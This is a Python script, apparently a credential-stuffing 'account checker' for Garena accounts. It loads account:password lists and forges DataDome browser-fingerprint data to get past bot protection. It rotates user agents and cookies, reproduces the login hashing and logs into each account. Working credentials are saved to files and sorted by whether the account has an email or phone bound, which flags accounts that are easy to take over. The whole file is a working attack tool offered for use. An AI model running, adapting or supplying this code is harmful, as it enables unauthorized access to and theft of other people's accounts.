import hashlib
import requests
import time
import json
import os
import urllib.parse
from Crypto.Cipher import AES
import logging
import random
import colorama

# Initialize colorama
colorama.init(autoreset=True)

class UserAgentRotator:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        ]

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(message)s',
    handlers=[
        logging.FileHandler('checker.log'),
        logging.StreamHandler()
    ]
)

# Initialize UserAgentRotator
ua_rotator = UserAgentRotator()

class Colors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    HEADER = '\033[95m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    """Apply cookies to the session from a cookie string."""
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        parts = item.split("=")
        if len(parts) == 2:
            key, value = parts
            cookie_dict[key.strip()] = value.strip()
        else:
            logging.warning(f"Skipping invalid cookie component: {item}")
    session.cookies.update(cookie_dict)

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'user-agent': ua_rotator.get_random_user_agent()
    }
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": ua_rotator.get_random_user_agent(), "wbd": False, "dp0": True, "tagpu": 5.738121195951787,
            "wdif": False, "wdifrm": False, "npmtm": False, "br_h": 738, "br_w": 260, "isf": False,
            "nddc": 1, "rs_h": 864, "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False,
            "lg": "en-US", "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True,
            "str_ls": True, "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True,
            "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False, "eva": 33,
            "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.", "bid": "NA",
            "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    try:
        response = session.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            logging.error(f"Error Status code: {response_json['status']}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'user-agent': ua_rotator.get_random_user_agent()
    }
    try:
        response = session.get(url, headers=headers, params=params)
        response.raise_for_status()
        data = response.json()
        new_datadome = response.cookies.get('datadome')
        if 'error' in data:
            logging.error(f"{account}: {data['error']}")
            return None, None, new_datadome
        logging.info(f"Prelogin successful for {account}")
        return data.get('v1'), data.get('v2'), new_datadome
    except Exception as e:
        logging.error(f"Prelogin error for {account}: {e}")
        return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': ua_rotator.get_random_user_agent()
    }
    try:
        response = session.get(url, headers=headers, params=params)
        response.raise_for_status()
        data = response.json()
        sso_key = response.cookies.get('sso_key')
        if 'error' in data:
            logging.error(f"Login failed for {account}: {data['error']}")
            return None
        logging.info(f"Login successful for {account}")
        return sso_key
    except requests.RequestException as e:
        logging.error(f"Login error for {account}: {e}")
        return None

def initaccount(session, sso_key):
    url = 'https://account.garena.com/api/account/init'
    headers = {
        'accept': '*/*',
        'cookie': f'sso_key={sso_key}',
        'referer': 'https://account.garena.com/',
        'user-agent': ua_rotator.get_random_user_agent()
    }
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()
        data = response.json()
        ac_session = response.cookies.get('ac_session')
        logging.info("Account initialization successful")
        return ac_session
    except requests.RequestException as e:
        logging.error(f"Account initialization failed: {e}")
        return None

def parse_account_details(data):
    user_info = data.get('user_info', {})
    binds = []

    if user_info.get('email'):
        binds.append('Email')
    if user_info.get('mobile_no'):
        binds.append('Phone')

    return {
        'username': user_info.get('username', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'mobile': user_info.get('mobile_no', 'N/A'),
        'country': user_info.get('acc_country', 'N/A'),
        'binds': binds,
        'status': 'Clean' if not binds else 'Binded'
    }

def get_fresh_cookie(session):
    cookies = session.cookies.get_dict()
    return '; '.join([f"{name}={value}" for name, value in cookies.items()])

def processaccount(session, account, password):
    datadome = get_datadome_cookie(session)
    if not datadome:
        return f"{account}: Datadome Failed"

    session.cookies.set('datadome', datadome)

    v1, v2, new_datadome = prelogin(session, account)
    if not v1 or not v2:
        return f"{account}: Invalid (Prelogin failed)"

    if new_datadome:
        session.cookies.set('datadome', new_datadome)

    sso_key = login(session, account, password, v1, v2)
    if not sso_key:
        return f"{account}: Invalid (Login failed)"

    session.cookies.set('sso_key', sso_key)

    ac_session = initaccount(session, sso_key)
    if not ac_session:
        return f"{account}: Invalid (Initialization failed)"

    session.cookies.set('ac_session', ac_session)

    account_init_url = 'https://account.garena.com/api/account/init'
    headers = {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': ua_rotator.get_random_user_agent()
    }

    try:
        response = session.get(account_init_url, headers=headers)
        response.raise_for_status()
        account_data = response.json()

        if 'error' in account_data:
            if account_data.get('error') == 'Wrong Password':
                return f"{account}: (Wrong Password)"

        details = parse_account_details(account_data)

        bind_status = "Clean" if not details['binds'] else f"Binded ({', '.join(details['binds'])})"

        return {
            'account': account,
            'password': password,
            'status': 'Success',
            'username': details['username'],
            'email': details['email'],
            'phone': details['mobile'],
            'country': details['country'],
            'bind_status': bind_status,
            'is_clean': len(details['binds']) == 0
        }

    except requests.RequestException as e:
        logging.error(f"Can't Fetch Account {account}: {e}")
        return f"{account}: Error fetching bind"

def save_fresh_cookie(cookie):
    if cookie:
        with open('fresh_cookies.txt', 'a') as f:
            f.write(f"{cookie}\n")

def get_random_cookie():
    """Retrieve a random cookie from the saved cookies file."""
    if os.path.exists('fresh_cookies.txt'):
        with open('fresh_cookies.txt', 'r') as f:
            cookies = f.read().splitlines()
        if cookies:
            return random.choice(cookies)
    return None  

def rotate_cookies(session):
    """Rotate through available cookies and return a fresh one."""
    cookies = []
    if os.path.exists('fresh_cookies.txt'):
        with open('fresh_cookies.txt', 'r') as f:
            cookies = f.read().splitlines()
    if cookies:
        return random.choice(cookies)
    return None

def manage_cookies(session):
    """Manage cookie rotation and validation."""
    current_cookie = get_random_cookie()
    if not current_cookie or not validate_cookie(session, current_cookie):
        datadome = get_datadome_cookie(session)
        if datadome:
            current_cookie = f'datadome={datadome}'
            save_fresh_cookie(current_cookie)
    return current_cookie

def validate_cookie(session, cookie):
    try:
        test_url = 'https://account.garena.com/'
        headers = {'Cookie': cookie}
        response = session.get(test_url, headers=headers)
        return response.status_code == 200
    except:
        return False

def cleanup_cookies():
    if not os.path.exists('fresh_cookies.txt'):
        return

    session = requests.Session()
    valid_cookies = []
    
    with open('fresh_cookies.txt', 'r') as f:
        cookies = f.read().splitlines()
    
    for cookie in cookies:
        if validate_cookie(session, cookie):
            valid_cookies.append(cookie)
    
    with open('fresh_cookies.txt', 'w') as f:
        f.write('\n'.join(valid_cookies))

def readaccount(filename):
    session = requests.Session()
    cookies_tried = set()

    try:
        with open(filename, 'r', encoding='utf-8') as file:
            accounts = [line.strip().split(':') for line in file]

        current_cookie = manage_cookies(session)
        if not current_cookie:
            current_cookie = input("No valid cookies found. Enter an initial cookie: ")

        for index, account_info in enumerate(accounts):
            if len(account_info) != 2:
                logging.warning(f"Invalid account format: {':'.join(account_info)}")
                continue

            account, password = account_info
            logging.info(f"{Colors.HEADER}Checking: {account}{Colors.ENDC}")

            if index % 5 == 0 or not validate_cookie(session, current_cookie):
                new_cookie = rotate_cookies(session)
                if new_cookie and new_cookie not in cookies_tried:
                    current_cookie = new_cookie
                    cookies_tried.add(current_cookie)

            applyck(session, current_cookie)

            result = processaccount(session, account, password)

            if isinstance(result, dict):
                fresh_cookie = get_fresh_cookie(session)
                if fresh_cookie:
                    save_fresh_cookie(fresh_cookie)
                    current_cookie = fresh_cookie

                if result['is_clean']:
                    with open('clean.txt', 'a') as clean_file:
                        clean_file.write(f"{result['account']}:{result['password']} - Status: Clean\n")
                    logging.info(f"{Colors.OKGREEN}Success: {result['account']} - Status: Clean{Colors.ENDC}")
                else:
                    with open('binds.txt', 'a') as binds_file:
                        binds_file.write(f"{result['account']}:{result['password']} - Status: {result['bind_status']}\n")
                    logging.info(f"{Colors.WARNING}Warning: {result['account']} - Status: {result['bind_status']}{Colors.ENDC}")
            else:
                logging.error(f"Failed: {result}")

            logging.info(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
            time.sleep(random.uniform(5, 10))

    except Exception as e:
        logging.error(f"Error reading accounts: {e}")
        logging.exception("Exception details:")

if __name__ == "__main__":
    print(f"{Colors.HEADER}Cookie Manager and Account Checker{Colors.ENDC}")
    print("Cleaning up invalid cookies...")
    cleanup_cookies()
    
    filename = input("Enter the filename containing accounts: ")
    readaccount(filename)